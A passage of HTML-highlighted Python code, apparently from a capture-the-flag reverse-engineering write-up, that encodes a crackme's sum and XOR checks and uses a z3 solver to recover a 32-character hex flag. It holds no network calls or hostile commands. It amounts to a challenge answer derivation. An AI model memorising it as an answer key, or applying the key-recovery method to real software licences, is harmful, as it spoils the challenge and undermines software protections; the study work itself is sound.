number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            F <span class="token operator">+=</span> li<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>m<span class="token operator">+</span>n<span class="token punctuation">]</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>F<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">count_xor25</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    F <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            F <span class="token operator">^</span><span class="token operator">=</span> li<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>m<span class="token operator">+</span>n<span class="token punctuation">]</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>F<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">count_add29</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    F <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            F <span class="token operator">+=</span> li<span class="token punctuation">[</span><span class="token number">8</span><span class="token operator">*</span>n<span class="token operator">+</span>m<span class="token punctuation">]</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>F<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">count_xor33</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    F <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            F <span class="token operator">^</span><span class="token operator">=</span> li<span class="token punctuation">[</span><span class="token number">8</span><span class="token operator">*</span>n<span class="token operator">+</span>m<span class="token punctuation">]</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>F<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token comment" spellcheck="true">#          0 1 2 3 4 5 6 7 8 9 a b c d e f </span><span class="token comment" spellcheck="true"># cipin = [3,2,2,0,3,2,1,3,3,1,1,3,1,2,2,3] sum_it = 2246</span><span class="token comment" spellcheck="true"># </span>v21 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x15E</span><span class="token punctuation">,</span><span class="token number">0x0DA</span><span class="token punctuation">,</span><span class="token number">0x12F</span><span class="token punctuation">,</span><span class="token number">0x131</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x131</span><span class="token punctuation">,</span><span class="token number">0x0FB</span><span class="token punctuation">,</span><span class="token number">0x102</span><span class="token punctuation">]</span>                v25 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x0F</span><span class="token punctuation">,</span><span class="token number">0x5C</span><span class="token punctuation">,</span><span class="token number">0x5</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">]</span>v29 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x129</span><span class="token punctuation">,</span><span class="token number">0x103</span><span class="token punctuation">,</span><span class="token number">0x12B</span><span class="token punctuation">,</span><span class="token number">0x131</span><span class="token punctuation">,</span><span class="token number">0x135</span><span class="token punctuation">,</span><span class="token number">0x10B</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">]</span>v33 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x7</span><span class="token punctuation">,</span><span class="token number">0x0D</span><span class="token punctuation">,</span><span class="token number">0x0D</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">]</span>v45 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x0FF</span><span class="token punctuation">]</span>test_li <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">49</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>sum_exp<span class="token punctuation">(</span>test_li<span class="token punctuation">)</span><span class="token punctuation">,</span>count_cipin<span class="token punctuation">(</span>test_li<span class="token punctuation">)</span><span class="token punctuation">,</span>count_add21<span class="token punctuation">(</span>test_li<span class="token punctuation">)</span><span class="token punctuation">,</span>count_xor25<span class="token punctuation">(</span>test_li<span class="token punctuation">)</span><span class="token punctuation">,</span>count_add29<span class="token punctuation">(</span>test_li<span class="token punctuation">)</span><span class="token punctuation">,</span>count_xor33<span class="token punctuation">(</span>test_li<span class="token punctuation">)</span><span class="token punctuation">)</span>k <span class="token operator">=</span> <span class="token punctuation">[</span>BitVec<span class="token punctuation">(</span><span class="token string">'k'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span>sol <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sol.add(count_cipin(k) == cipin)</span>fake_flag1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sol.add(k!=fake_flag1)</span><span class="token comment" spellcheck="true">#sol.add(count_add21(k) == v21)</span>sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> v21<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> v21<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> v21<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> v21<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">==</span> v21<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> v21<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> v21<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> v21<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sol.add(count_xor25(k) == v25)</span>sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> v25<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> v25<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> v25<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> v25<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">==</span> v25<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> v25<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> v25<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> v25<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sol.add(count_add29(k) == v29)</span>sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> v29<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> v29<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">==</span> v29<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> v29<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">==</span> v29<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> v29<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> v29<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> v29<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sol.add(count_xor33(k) == v33)</span>sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> v33<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> v33<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">==</span> v33<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> v33<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">==</span> v33<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> v33<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>   k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> v33<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> v33<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>point <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> v45<span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>k<span class="token punctuation">[</span>point<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">48</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span>point<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">57</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>k<span class="token punctuation">[</span>point<span class="token punctuation">]</span><span class="token operator">></span><span class="token number">96</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span>point<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">102</span><span class="token punctuation">)</span>    point <span class="token operator">+=</span> <span class="token number">1</span>sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>sum<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2246</span><span class="token punctuation">,</span>  k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x488</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">31</span><span class="token 